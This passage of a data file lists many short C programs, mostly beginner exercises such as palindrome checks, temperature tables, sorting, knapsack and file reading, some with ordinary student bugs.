    "#include <stdio.h>\n#include <stdlib.h>\nvoid my_init(void)\n{\n    printf(\"Hello\");\n}\ntypedef void (*ctor_t)(void);\nctor_t __attribute__((section(\".ctors\"))) my_init_p = &my_init;\nint main()\n{\n    printf(\"World!\\n\");\n    system(\"pause\");\n    return 0;\n}",
    "#include <limits.h>\nint main() {\n  unsigned int m = (2147483647 *2U +1U), c = 0;\n  do { c++; } while (m >>= 1);\n  return c;\n}",
    "#include <stdio.h>\nchar lower_case(char c);\nint main()\n{\n char c = 'A', lower_c;\n lower_c = lower_case(c);\n printf(\"Lower case of %c is: %c\\n\", c, lower_c);\n return 0;\n}\nchar lower_case(char c)\n{\n return ((char)(c + 32));\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n#include <inttypes.h>\n#include <math.h>\n\nstatic inline uint64_t fact(uint8_t n, uint64_t inc);\nstatic inline uint64_t binomial(uint8_t n, uint8_t k);\nstatic inline uint64_t bell(uint8_t n);\nint main(int argc, char **argv) {\n printf(\"Bell: %\" \"llu\" \".\\n\", bell(21));\n    return 0;\n}\nstatic inline uint64_t fact(uint8_t n, uint64_t inc) {\n return (n == 0) ? inc : fact(n - 1, inc * (uint64_t)n);\n}\nstatic inline uint64_t binomial(uint8_t n, uint8_t k) {\n return fact(n, 1) / (fact(k, 1) * fact(n - k, 1));\n}\nstatic inline uint64_t bell(uint8_t N) {\n if (N == 0) {\n  return 1;\n }\n uint8_t i, n = N - 1;\n uint64_t sum = 0;\n for (i = 0; i <= n; i++) {\n  sum += binomial(n, i) * bell(i);\n }\n return sum;\n}",
    "#include <stdio.h>\nint main()\n{\n int fahr, cent;\n int lower, upper, step;\n lower = 0;\n upper = 300;\n step = 10;\n fahr = lower;\n while (fahr <= upper)\n {\n  cent = 5 * (fahr - 32) / 9;\n  printf(\"%d\\t%d\\n\", fahr, cent);\n  fahr = fahr + step;\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(){\nint arr[10];\nint n, r, i;\nfor (i = 0; i < 10; i++)\narr[i] = 0;\nscanf(\"%d\", &n);\nwhile (n != 0) {\nr = n%10;\narr[r]++;\nn/=10;\n}\nprintf(\"Digits:\");\nfor (i = 0; i<10; i++)\nprintf(\"%2d\", i);\nprintf(\"\\nOccurences: \");\nfor (i = 0; i<10; i++)\nprintf(\"%d\", arr[i]);\n}",
    "#include<stdio.h>\n#include<math.h>\nint main(void){\n   int num, num1, num2, num3, num4, num5, numrev, numtemp;\n   printf(\"Digite um numero de cinco digitos: \");\n   scanf(\"%d\",&num);\n   numtemp = num;\n    if(num < 100000 && num > 9999){\n        num1 = num % 10;\n        num = num / 10;\n        num2 = num % 10;\n        num = num / 10;\n        num3 = num % 10;\n        num = num / 10;\n        num4 = num % 10;\n        num = num / 10;\n        num5 = num % 10;\n        num1 = num1*10000;\n        num2 = num2*1000;\n        num3 = num3*100;\n        num4 = num4*10;\n        num5 = num5*1;\n    numrev = num1 + num2 + num3 + num4 + num5;\n    num = numtemp;\n        if(numrev == num){\n            printf(\"o numero %d e um palindromo\",num);\n        }\n        else{\n            printf(\"O numero %d nao e um palindromo\",num);\n        }\n    }\n    else{\n        printf(\"Digite um valor com cinco digitos\");\n    }\nreturn 0;\n}",
    "#include <stdio.h>\n#include <math.h>\n#include <fenv.h>\n#pragma STDC FENV_ACCESS ON\nvoid show_fe_current_rounding_direction(void)\n{\n    printf(\"current rounding direction:  \");\n    switch (fegetround()) {\n           case 0: printf (\"FE_TONEAREST\"); break;\n           case FE_DOWNWARD: printf (\"FE_DOWNWARD\"); break;\n           case FE_UPWARD: printf (\"FE_UPWARD\"); break;\n           case FE_TOWARDZERO: printf (\"FE_TOWARDZERO\"); break;\n           default: printf (\"unknown\");\n    };\n    printf(\"\\n\");\n}\nint main(void)\n{\n    show_fe_current_rounding_direction();\n    printf(\"+11.5 -> %+4.1f\\n\", rint(+11.5));\n    printf(\"+12.5 -> %+4.1f\\n\", rint(+12.5));\n    int curr_direction = fegetround();\n    fesetround(FE_DOWNWARD);\n    show_fe_current_rounding_direction();\n    printf(\"+11.5 -> %+4.1f\\n\", rint(+11.5));\n    printf(\"+12.5 -> %+4.1f\\n\", rint(+12.5));\n    fesetround(curr_direction);\n    show_fe_current_rounding_direction();\n    return 0;\n}",
    "#include <stdio.h>\n\nint main(){\nint n,i,m,vet[1000],cont1=0,cont=0,x;\n scanf(\"%d %d\",&n,&m);\n for(i=0;i<n;i++){\n     scanf(\"%d\",&vet[i]);\n }\n for(i=0;i<n;i++){\n     if(vet[i]<=0){\n     cont=cont+1;}\n     if (vet[i]>0){\n         cont1=cont1+1;\n     }\n }\n    if(cont>=m){\n        printf(\"NAO\\n\");\n    for(i=n-1;i>=0;i--){\n     if(vet[i]<=0){\n     printf(\"%d\\n\",i+1);}}}\n    else {\n        printf(\"SIM\\n\");\n    }\nreturn 0;\n}",
    "#include <stdio.h>\nint main(void)\n{\n    unsigned int uint = 0xffffffff;\n    unsigned char uchar = 0xff;\n    if (uint + 10 < 10) {\n printf(\"uint + 10 < 10\\n\");\n    } else {\n printf(\"uint + 10 >= 10\\n\");\n    }\n    if (uchar + 10 < 10) {\n printf(\"uchar + 10 < 10\\n\");\n    } else {\n printf(\"uchar + 10 >= 10\\n\");\n    }\n    printf(\"uchar + 10..%u\\n\", uchar + 10);\n    uchar = uchar + 10;\n    printf(\"uchar..%u\\n\", uchar);\n}",
    "#include <stdio.h>\nint checkrow(int r,int c,int chess1[8][8]){\n    int j;\n    for(j=0;j<8;j++){\n        if(j==c)\n        continue;\n        else{\n            if(chess1[r][j]==1)\n            return 1;\n        }\n    }\n    return 0;\n}\nint checkcolumn(int r,int c,int chess1[8][8]){\n    int i;\n    for(i=0;i<8;i++){\n        if(i==r)\n        continue;\n        else{\n            if(chess1[i][c]==1)\n            return 1;\n        }\n    }\n    return 0;\n}\nint checkdiagonal(int r,int c,int chess1[8][8]){\n    int i,j;\n    j=c+1;\n    for(i=r+1;i<8;i++){\n        if(j<8){\n        if (chess1[i][j]==1)\n        return 1;}\n        j++;\n    }\n    j=c-1;\n    for(i=r+1;i<8;i++){\n        if(j>=0){\n        if(chess1[i][j]==1)\n        return 1;}\n        j--;\n    }\n    j=c-1;\n    for(i=r-1;i>=0;i--){\n        if(j>=0){\n        if(chess1[i][j]==1)\n        return 1;}\n        j--;\n    }\n    j=c+1;\n    for(i=r-1;i>=0;i--){\n        if(j<8){\n        if(chess1[i][j]==1)\n        return 1;}\n        j++;\n    }\n    return 0;\n}\nint main() {\n int chess[8][8];\n int i,j,N,R,C,count=0;\n for(i=0;i<8;i++){\n     for(j=0;j<8;j++){\n         chess[i][j]=0;\n     }\n }\n scanf(\"%d\\n\",&N);\n for(i=1;i<=N;i++){\n     scanf(\"%d%d\\n\",&R,&C);\n     chess[R][C]=1;\n }\n for(i=0;i<8;i++){\n     for(j=0;j<8;j++){\n         if (chess[i][j]==1){\n             if(!(checkrow(i,j,chess) || checkcolumn(i,j,chess) || checkdiagonal(i,j,chess))){\n                 count++;\n             }\n         }\n     }\n }\n if(count==N){\n     printf(\"yes\");\n }\n else{\n     printf(\"no\");\n }\n return 0;\n}",
    "#include <stdint.h>\n#include <stdio.h>\n#include <inttypes.h>\n#include <byteswap.h>\nuint32_t read_from_little_endian (uint32_t value)\n{\n    const uint8_t* p_data = (uint8_t*)&value;\n    return (p_data[0] << 0) | (p_data[1] << 8) | (p_data[2] << 16) | (p_data[3] << 24);\n}\nuint32_t read_from_big_endian (uint32_t value)\n{\n    const uint8_t* p_data = (uint8_t*)&value;\n    return (p_data[3] << 0) | (p_data[2] << 8) | (p_data[1] << 16) | (p_data[0] << 24);\n}\nint main (void)\n{\n    const uint32_t data_little_endian = 67305985;\n    const uint32_t data_big_endian = 16909060;\n    {\n        const uint8_t* p_data = (uint8_t*)&data_little_endian;\n        printf (\"data[0]=0x%02x\\n\", p_data[0]);\n        printf (\"data[0]=0x%02x\\n\", p_data[1]);\n        printf (\"data[0]=0x%02x\\n\", p_data[2]);\n        printf (\"data[0]=0x%02x\\n\", p_data[3]);\n    }\n    printf (\"read_from_little_endian (%\" \"u\" \")=%\" \"u\" \"\\n\", data_little_endian, read_from_little_endian (data_little_endian));\n    printf (\"read_from_little_endian (%\" \"u\" \")=%\" \"u\" \"\\n\", data_big_endian, read_from_little_endian (data_big_endian));\n    {\n        const uint8_t* p_data = (uint8_t*)&data_big_endian;\n        printf (\"data[0]=0x%02x\\n\", p_data[0]);\n        printf (\"data[0]=0x%02x\\n\", p_data[1]);\n        printf (\"data[0]=0x%02x\\n\", p_data[2]);\n        printf (\"data[0]=0x%02x\\n\", p_data[3]);\n    }\n    printf (\"read_from_big_endian (%\" \"u\" \")=%\" \"u\" \"\\n\", data_little_endian, read_from_big_endian (data_little_endian));\n    printf (\"read_from_big_endian (%\" \"u\" \")=%\" \"u\" \"\\n\", data_big_endian, read_from_big_endian (data_big_endian));\n    printf (\"bswap_32(%\" \"u\" \")=%\" \"u\" \"\\n\", data_little_endian, __bswap_32(data_little_endian));\n    printf (\"bswap_32(%\" \"u\" \")=%\" \"u\" \"\\n\", data_big_endian, __bswap_32(data_big_endian));\n}",
    "#include<stdio.h>\nint main()\n{\n    int n,reverse=0;\n    printf(\"Please enter a number\\n\");\n    scanf(\"%d\",&n);\n    int t=n;\n    while(t)\n    {\n       reverse=reverse*10+(t%10);\n       t/=10;\n    }\n    if(n==reverse)\n        printf(\"%d is a Palindrome\",n);\n    else\n        printf(\"%d is not a Palindrome\",n);\n}",
    "#include <stdio.h>\nint main(int argc, char *argv[]){\n  float a = 1.23456123456;\n  float b = 1.23456123452;\n  float c;\n  c = a - b;\n  printf(\"a = %13.20f\\n\", a);\n  printf(\"b = %13.20f\\n\", b);\n  printf(\"c = %13.20f\\n\", c);\n}",
    "#include<stdio.h>\nint main()\n{\n    int a=0,t,k,op1[6],op2[6];\n    scanf(\"%d\",&t);\n    while(t--)\n    {\n        if(t%2!=0)\n        {\n            scanf(\"%s %d\",&op1,&k);\n            a=a+k;\n        }\n        else\n        {\n            scanf(\"%s\",&op2);\n            printf(\"%d\\n\",a);\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\nlong long p = 1000000007;\nlong long poww(long long B, long long po, long long p)\n{\n if(po == 1) return 1;\n if(po == 1) return B%p;\n long long v = poww(B, po >> 1 , p);\n v = v * v % p;\n if(po & 1) return v * B % p;\n else return v;\n}\nint main(void)\n{\n int N, K;\n scanf(\"%d %d\", &N, &K);\n int i;\n long long A = 1, B = 1;\n K = K < N-K ? K : N-K;\n for(i=1;i<=K;i++)\n {\n  A = (A * (N-i+1)) % p;\n  B = (B * i) % p;\n }\n printf(\"%lld\\n\", (A * poww(B, p-2, p))%p);\n return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  float fahr, celsius;\n  int lower, upper, step;\n  lower = 0;\n  upper = 300;\n  step = 20;\n  printf(\"Fahr Celsius\\n\");\n  fahr = lower;\n  while (fahr <= upper)\n  {\n    celsius = (5.0/9.0) * (fahr-32.0);\n    printf(\"%3.0f %6.1f\\n\", fahr, celsius);\n    fahr = fahr + step;\n  }\n}",
    "#include <stdio.h>\n#include <string.h>\nint word_counter(char * str1)\n{\n  int space_counter = 0;\n  for (int i =0;i < strlen(str1);i++)\n  {\n    if (str1[i] == ' ')\n    {\n      space_counter += 1;\n    }\n  }\n  return space_counter + 1;\n}\nint main()\n{\n  char *str1 = \"This is a test string lets add another word\";\n  int word = word_counter(str1);\n  printf(\"%s \\n %d words\\n\", str1,word);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n int n;\n scanf(\"%i\", &n);\n printf(\"%i\", (n/20)*20 + 10);\n return 0;\n}",
    "#include<stdio.h>\n#include<stdlib.h>\nint main(){\n    int A[3][4] = {{1,2,3,4},{2,4,6,8},{1,3,5,7}};\n    int *B[3];\n    int **C;\n    B[0] = (int *)malloc(4*sizeof(int));\n    B[1] = (int *)malloc(4*sizeof(int));\n    B[2] = (int *)malloc(4*sizeof(int));\n    C = (int **)malloc(3*sizeof(int *));\n    C[0] = (int *)malloc(4*sizeof(int));\n    C[1] = (int *)malloc(4*sizeof(int));\n    C[2] = (int *)malloc(4*sizeof(int));\n    for(int i = 0; i < 3; i++){\n        for(int j = 0; j < 4; j++){\n            printf(\"%d \", A[i][j]);\n        }\n        printf(\"\\n\");\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint pw(int sayi, int us)\n{\n    int sonuc = 1;\n    for (int i = 0; i < us; i++)\n    {\n        sonuc = sayi * sonuc;\n    }\n    return sonuc;\n}\nint armstrong(int *ptr)\n{\n    int basamak = 0, temp, toplam, kalan;\n    temp = *ptr;\n    while (temp > 0)\n    {\n        temp = temp / 10;\n        basamak++;\n    }\n    int sayi = *ptr;\n    while (sayi > 0)\n    {\n        kalan = sayi % 10;\n        toplam = toplam + pw(kalan, basamak);\n        sayi = sayi / 10;\n    }\n    if (toplam == *ptr)\n        return 1;\n    else\n        return 0;\n}\nint main()\n{\n    int *ptr, sayi;\n    printf(\"Bir Sayi Giriniz: \");\n    scanf(\"%d\", &sayi);\n    ptr = &sayi;\n    if (armstrong(ptr))\n    {\n        printf(\"%d Sayisi armstrong bir sayidir.\", sayi);\n    }\n    else\n    {\n        printf(\"%d sayisi armstrong bir sayi degildir.\", sayi);\n    }\n}",
    "#include<stdio.h>\nint min(int a, int b) {\n   if(a<b){\n    return a;\n }\n else{\n  return b;\n }\n}\nint main(){\n int no_of_denomination,amount,denomination[100],i,j;\n int ch[20][20],min_coin=99999999;;\n printf(\"Enter the amount you want to exchange:\");\n scanf(\"%d\",&amount);\n printf(\"Enter the no. of denomination:\");\n scanf(\"%d\",&no_of_denomination);\n printf(\"Denomination are:\\n\");\n for(i=1;i<=no_of_denomination;i++){\n  scanf(\"%d\",&denomination[i]);\n }\n int ch_amount[amount+1];\n   int t[no_of_denomination][amount+1];\n   for(i=1;i<=no_of_denomination;i++){\n    for(j=0;j<amount+1;j++){\n     if(j==0){\n      t[i][j]=0;\n   }\n     else if(denomination[i]==1){\n   t[i][j]=1+t[i][j-1];\n  }\n  else if(j<denomination[i]){\n   t[i][j]=t[i-1][j];\n  }\n  else{\n   t[i][j]=min(t[i-1][j],1+t[i][j-denomination[i]]);\n  }\n   printf(\"t[%d][%d]=%d\\n\",i,j,t[i][j]);\n         min_coin=min(t[i][amount],t[i][amount]);\n  }\n }\n   printf(\"minimum no. of coin required: %d\",min_coin);\n return 0;\n}",
    "#include <stdio.h>\n#include <unistd.h>\n#include <string.h>\n#include <stdlib.h>\n#include <pthread.h>\npthread_t tid[2];\nvoid* thread_fun(void *);\nint main()\n{\n printf(\"\\nCreating thread\\n\");\n pthread_create(&(tid[0]), ((void*)0), thread_fun, \"\\nHello\");\n pthread_create(&tid[1], ((void*)0), thread_fun, \"\\nByee\");\n printf(\"\\nCreated thread\\n\");\n pthread_join(tid[0], ((void*)0));\n pthread_join(tid[1], ((void*)0));\n return 0;\n}\nvoid* thread_fun(void *arg)\n{\n printf(\"\\n%s\\n\",(char*)arg);\n return ((void*)0);\n}",
    "int main(){\n int x = 1 <= 1;\n return x;\n}",
    "#include <stdio.h>\nint main() {\n FILE *fp;\n int iout[7] = { 5,6,7,8,9,10,11 };\n int iin[5] = { 0 };\n int i;\n fp = fopen(\"zahlen\", \"w\");\n if (fp == ((void*)0)) {\n  printf(\"Error opening zahlen for writing\\n\");\n  return 1;\n } else {\n  printf(\"Opening zahlen for writing\\n\");\n  for (i=0; i<7; i++) {\n   fprintf(fp, \"%i\\n\", iout[i]);\n  }\n  fclose(fp);\n }\n fp = fopen(\"zahlen\", \"r\");\n if (fp == ((void*)0)) {\n  printf(\"Error opening zahlen for reading\\n\");\n  return 1;\n } else {\n  printf(\"Opening zahlen for reading\\n\");\n  i = 0;\n  while ( (fscanf(fp, \"%i\", &iin[i]) != (-1)) && i<5) {\n   i++;\n  }\n  fclose(fp);\n  for (i=0; i<5; i++) {\n   printf(\"%i\\n\", iin[i]);\n  }\n }\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main()\n{\n int i;\n printf(\"Displaying number from one to fifteen using for loop:\\n\");\n for(i=1;i<16;i++)\n  printf(\"%d\\n\",i);\n return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nint main(int argc, char **argv)\n{\n    FILE *fp;\n    if(argc!=2)\n    {\n        printf(\"Please enter exactly one Input File Name\");\n        return 1;\n    }\n    fp = fopen(\"Input.txt\", \"r\");\n    if(0 != fclose(fp))\n    {\n        perror(\"Main:Closig of Input.txt->\");\n        return 1;\n    }\n    return 0;\n}",
    "#include <stdlib.h>\n#include <stdio.h>\nint main(int argc, char *argv[])\n{\n  int *m = malloc(12);\n  int *n = malloc(13);\n  int *z = malloc(25);\n  printf(\"test-leak %p %p %p\\n\", m, n, z);\n  free(m); free(n);\n  return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n  int i;\n  puts (\"This should print \\\"wow = I\\\" for I from 0 to 39 inclusive.\");\n  for (i = 0; i < 40; i++)\n    printf (\"%s = %d\\n\", \"wow\", i);\n  return 0;\n}",
    "#include <stdio.h>\nint main(){\n    int r1, iguais = 0;\n    scanf(\"%d\", &r1);\n    int vet1[r1];\n    for(int c1 = 0; c1 < r1; c1++){\n        scanf(\"%d\", &vet1[c1]);\n    }\n    for(int c1 = 0; c1 < r1; c1++){\n        for(int c2 =(c1 +1); c2 < r1; c2++){\n            if(vet1[c1] ==vet1[c2]){\n                iguais++;\n            }\n        }\n    }\n    printf(\"%d\", iguais);\n    return 0;\n}",
    "#include <string.h>\n#include <stdio.h>\nint main() {\n    const char *string = \"Hello\";\n    const char *string2 = \"Hello\";\n    const char *string3 = \"HELLO\";\n    if (strcmp(string, string2) == 0) {\n        printf(\"%s\\n\", \"true\");\n    } else if (strcmp(string, string3) == 0) {\n        printf(\"%s\\n\", \"error\");\n    } else {\n        printf(\"%s\\n\", \"unknown\");\n    }\n    printf(\"%d\\n\",strcmp(\"1\",\"3\"));\n    printf(\"%d\\n\",strcmp(\"3\",\"1\"));\n    printf(\"%d\\n\",strcmp(\"30\",\"1\"));\n    return 0;\n}",
    "#include <stdio.h>\nint main()\n{\n    int N, a, a_bound, b, b_bound, c, c_bound, no_of_test_cases, i;\n    long long no_of_solutions;\n    scanf(\"%d\",&no_of_test_cases);\n    for(i = 1; i <= no_of_test_cases; i++)\n    {\n        scanf(\"%d %d %d %d\",&N, &a_bound, &b_bound, &c_bound);\n        no_of_solutions = 0;\n        for(a = 0; a <= a_bound; a++)\n        {\n            for(b = 0; b <= b_bound; b++)\n            {\n                c = N - (a + b);\n                if(c >= 0)\n                {\n                    no_of_solutions += (c <= c_bound ? c : c_bound) + 1;\n                }\n            }\n        }\n        printf(\"%lld\\n\",no_of_solutions);\n    }\n    return 0;\n}",
    "#include <stdio.h>\nint mnozenie(int liczba1, int liczba2);\nint main() {\n}\nint mmnozenie(int liczba1, int liczba2) {\n  return liczba1 * liczba2;\n}",
    "#include<stdio.h>\nvoid insertion_sort(int *, int );\nint main()\n{\n int i, size;\n printf(\"\\nEnter the size of array : \");\n scanf(\"%d\", &size);\n int arr[size];\n printf(\"\\nEnter the elements of array are : \");\n for(i=0; i<size; i++)\n   scanf(\"%d\", &arr[i]);\n printf(\"\\nElements of array are : \");\n for(i=0; i<size; i++)\n   printf(\"%d, \", arr[i]);\n insertion_sort(arr, size);\n printf(\"\\n\\nSorted array using insertion sort : \");\n for(i=0; i<size; i++)\n   printf(\"%d, \", arr[i]);\n printf(\"\\n\\n\");\n return 0;\n}\nvoid insertion_sort(int *arr, int n)\n{\n int i, j, key;\n for(i=0; i<n; i++)\n {\n    key = arr[i];\n    j = i-1;\n    while((j >=0) && (arr[j] >key))\n    {\n      arr[j+1] = arr[j];\n  j = j-1;\n    }\n    arr[j+1] = key;\n        }\n}",
    "#include<stdio.h>\n#include<math.h>\n\nint num[20];\nint isPrime(int n){\n    int sqr,i;\n    if(n<=1){\n        return 0;\n    }else{\n        sqr=(int)sqrt(1.0*n);\n        for(i=2;i<=sqr;i++){\n            if(n%i==0){\n                return 0;\n            }\n        }\n    }\n    return 1;\n}\nint Reverse(int n,int radix){\n    int k=0,i=0,sum=0;\n    do{\n        num[k++]=n%radix;\n        n/=radix;\n    }while(n);\n    while(i<k){\n        sum=sum*radix+num[i++];\n    }\n    return sum;\n}\nint main(){\n    int n,rad;\n    while(1){\n        scanf(\"%d\",&n);\n        if(n<0){\n            break;\n        }\n        scanf(\"%d\",&rad);\n        if(isPrime(n)&&isPrime(Reverse(n,rad))){\n            printf(\"Yes\\n\");\n        }else{\n            printf(\"No\\n\");\n        }\n    }\n    return 0;\n}",
    "#include <stdio.h>\n\nint main (){\ndouble arr[25] = {5};\nfor (size_t i=0; i<25; ++i){\nprintf(\"arr[%lu]=%lf \\n\",i,arr[i]);\n}\nfor (size_t i=0; i<25; ++i){\n   scanf(\"%lf\",&arr[i]);\n}\nfor (int i=0; i<25; ++i){\nprintf(\"arr[%d]=%lf,\\t\" ,i,arr[i]);\n}\ngetchar();\n}",
    "#include <stdio.h>\nint main ()\n{\n    int i;\n    i=0;\n    while(i<5);\n     printf(\"%d \",i++ );\n return 0;\n}",
    "#include <stdio.h>\nint value[10][10];\nint max(int a, int b);\nint knapsack(int n, int m, int cost[], int weight[]);\nint main() {\n    int i, j, n, m, cost[10], weight[10], optiVal;\n    printf(\"Enter the number of items: \");\n    scanf(\"%d\", &n);\n    printf(\"Enter the weights of each item: \");\n    for (i = 1; i <= n; i++)\n        scanf(\"%d\", &weight[i]);\n    printf(\"Enter the profits of each item: \");\n    for (i = 1; i <= n; i++)\n        scanf(\"%d\", &cost[i]);\n    printf(\"Enter the capacity of knapsack: \");\n    scanf(\"%d\", &m);\n    optiVal = knapsack(n, m, cost, weight);\n    printf(\"Solution to the Knapsack Problem:\\n\");\n    for (i = 0; i <= n; i++) {\n        for (j = 0; j <= m; j++)\n            printf(\"%d\\t\", value[i][j]);\n        printf(\"\\n\");\n    }\n    printf(\"\\nThe optimal solution value is: %d\", optiVal);\n    return 0;\n}\nint max(int a, int b) {\n    return (a > b) ? a : b;\n}\nint knapsack(int n, int m, int cost[], int weight[]) {\n    int i, j;\n    for (i = 1; i <= n; i++)\n        for (j = 1; j <= m; j++)\n            value[i][j] = (j < weight[i]) ? value[i - 1][j] : max(value[i - 1][j], cost[i] + value[i - 1][j - weight[i]]);\n    return value[n][m];\n}",
    "#include <limits.h>\n#include <stdlib.h>\n#include <stdio.h>\nint main () {\n    FILE *stream = fopen(\"inputs/input7\", \"r\");\n    int horiz[5000];\n    int horiz_len = 0;\n    do {\n        fscanf(stream, \"%d\", horiz + (horiz_len++));\n    } while (fgetc(stream) == ',');\n    int min = 2147483647;\n    int max = (-2147483647 -1);\n    for (int i = 0; i < horiz_len; ++i) {\n        if (horiz[i] > max) {\n            max = horiz[i];\n        } else if (horiz[i] < min) {\n            min = horiz[i];\n        }\n    }\n    int min_fuel = 2147483647;\n    for (int i = min; i <= max; ++i) {\n        int fuel_needed = 0;\n        for (int j = 0; j < horiz_len; ++j) {\n            int diff = abs(horiz[j] - i);\n            fuel_needed += (diff * (diff + 1)) / 2;\n        }\n        if (fuel_needed < min_fuel) {\n            min_fuel = fuel_needed;\n        }\n    }\n    printf(\"%d\\n\", min_fuel);\n    fclose(stream);\n    return 0;\n}",
    "#include <stdio.h>\nvoid getStartStop(int*, int*);\nvoid getCheckNum(int*);\nvoid printAbundantNumbers(int, int);\nint returnIfAbundant();\nint main() {\n    int start, stop;\n    getStartStop(&start, &stop);\n    printAbundantNumbers(start, stop);\n    int checkAbundance;\n    getCheckNum(&checkAbundance);\n    int isAbundant = returnIfAbundant(checkAbundance);\n    printf(\"%d\\n\", isAbundant);\n    return 0;\n}\nvoid printAbundantNumbers(int startNum, int stopNum) {\n    while (startNum <= stopNum) {\n        int divisors = 0;\n        for (int i = 1; i < startNum + 1; ++i)\n            divisors += (startNum % i == 0) ? i : 0;\n        if (divisors > (2 * startNum))\n            printf(\"%d is abundant\\n\", startNum);\n        ++startNum;\n    }\n}\nint returnIfAbundant(int num) {\n    int divisors = 0;\n    for (int i = 1; i < num + 1; ++i)\n        divisors += (num % i == 0) ? i : 0;\n    return divisors > (2 * num);\n}\nvoid getStartStop(int* pStart, int* pStop) {\n    printf(\"Enter your starting number: \");\n    scanf(\"%d\", &*pStart);\n    printf(\"Enter your stopping number: \");\n    scanf(\"%d\", &*pStop);\n}\nvoid getCheckNum(int* pCheckNum) {\n    printf(\"Enter the number to check for abundance: \");\n    scanf(\"%d\", &*pCheckNum);\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <string.h>\n\nchar *sgets(char *st, int n);\nint main(void)\n{\n int ch;\n FILE *fp;\n char file_name[81];\n unsigned long count = 0;\n char *check;\n do {\n  printf(\"Enter name of a file: \");\n  check = sgets(file_name, 81);\n } while (!check && file_name[0] != '\\0');\n if ((fp = fopen(file_name, \"r\")) == ((void*)0)) {\n  printf(\"Can't open %s\\n\", file_name);\n  exit(1);\n }\n while ((ch = getc(fp)) != (-1)) {\n  putc(ch, (stdout));\n  count++;\n }\n fclose(fp);\n printf(\"File %s has %lu characters\\n\", file_name, count);\n return 0;\n}\nchar *sgets(char *st, int n)\n{\n char *ret_val;\n char *new_line;\n ret_val = fgets(st, n, (stdin));\n if (ret_val) {\n  new_line = strchr(st, '\\n');\n  if (new_line)\n   *new_line = '\\0';\n  else\n   while (getchar() != '\\n')\n    continue;\n }\n return ret_val;\n}",
    "#include <stdio.h>\nvoid print_line(int array[], int length) {\n  for (int i = 0; i < length; i++) {\n    if (array[i])\n      printf(\"%05X\", array[i]);\n    else\n      printf(\"     \");\n  }\n  printf(\"\\n\");\n}\nvoid mystery() {\n  int buffer[3000];\n  int r1, r2, r3, rX;\n  r1 = 1;\n  r2 = 0;\n  rX = 0xAAAAA;\n  do {\n    r3 = r1;\n    do {\n      buffer[r2++] = 0;\n    } while (--r3 > 0);\n    buffer[r2++] = rX;\n  } while (++r1 < 75);\n  r2 = -2400;\n  do {\n    print_line(buffer + 2400 + r2, 24);\n    r2 += 24;\n  } while (r2 < 0);\n}\nint main() { mystery(); }",
    "#include<stdio.h>\nint f(int);\nint main()\n{\n    int n;\n    scanf(\"%d\",&n);\n    n=n+1;\n    while(f(n)!=1)\n    {\n        n=n+1;\n    }\n    printf(\"%d\",n);\n}\nint f(int x)\n{\n    int i,k=1;\n    for(i=2;i<x;i++)\n    {\n        k=k*(x%i!=0);\n    }\n    return k;\n}",
    "int main(void) {\n return (_Bool)(unsigned char)256;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\n#include <stdint.h>\n\nint main(void)\n{\n int32_t num1;\n int32_t temp;\n int32_t mask = 0b10010000;\n printf(\"Enter a number: \");\n scanf(\"%d\", &num1);\n temp = num1 | mask;\n printf(\"[input]  [output] : 0x%X 0x%X\\n\", num1, temp);\n return 0;\n}",
    "#include<stdio.h>\nint p(int);\nint main()\n{\n int n,z,i=1;\n scanf(\"%d\",&n);\n while(1){\n  if(p(n+i)){\n   printf(\"%d\",n+i);\n   return 0;\n  }\n  i++;\n }\n}\nint p(int n){\n int i;\n for(i=2;i<n;i++)\n  if(n%i==0)\n   return 0;\n return 1;\n}",
    "#include <stdio.h>\nint imin(int a, int b);\nint a,b;\nint main(void)\n{\n    printf(\"Enter number #1 and number #2 (or q for quit): \");\n    while(scanf(\"%d%d\", &a, &b)==2)\n    {\n        printf(\"Smallest number = %d.\\n\", imin(a,b));\n        printf(\"Enter number #1 and number #2 (or q for quit): \");\n    }\n    return 0;\n}\nint imin(int a, int b)\n{\n    return ((a<b)?a:b);\n}",
    "#include<stdio.h>\n\n\nint main(void)\n{\n char arr[5][10]={\n      \"white\",\n      \"red\",\n      \"green\",\n      \"yellow\",\n      \"blue\"\n     };\n int i;\n for(i=0; i<5; i++)\n {\n  printf(\"String=%s\\t\",arr[i]);\n  printf(\"Address of string=%p\\n\",arr[i]);\n }\n return 0;\n}",
    "#include <stdio.h>\nint main(int argc, char const *argv[])\n{\n    double x, y;\n    scanf(\"%lf\", &x);\n    printf(\"x = %f\\n\", x);\n    int i = -1;\n    i = (x >= 0) + (x > 0);\n    switch (i) {\n        case 0:\n            y = -1;\n            break;\n        case 1:\n            y = 0;\n            break;\n        case 2:\n            y = 2 * x;\n            break;\n        default:\n            printf(\"bug\\n\");\n    }\n    printf(\"f(x) = %.2f\\n\", y);\n    return 0;\n}",
    "#include <stdio.h>\n#include <stdlib.h>\nvoid modulo(int *vet, int tam){\n    int i;\n    for(i=0;i<tam;i++){\n        if(vet[i]<0){\n            vet[i]=vet[i] * -1;\n        }\n    }\n}\nint main(){\n    int vet[5],i;\n    puts(\"Informe os valores do vetor:\\n\");\n    for(i=0;i<5;i++){\n        scanf(\"%d\", &vet[i]);\n    }\n    modulo(vet,i);\n    puts(\"O modeulo do vetor eh\\n\");\n    for(i=0;i<5;i++){\n        printf(\"%d \", vet[i]);\n    }\n    return 0;\n}",
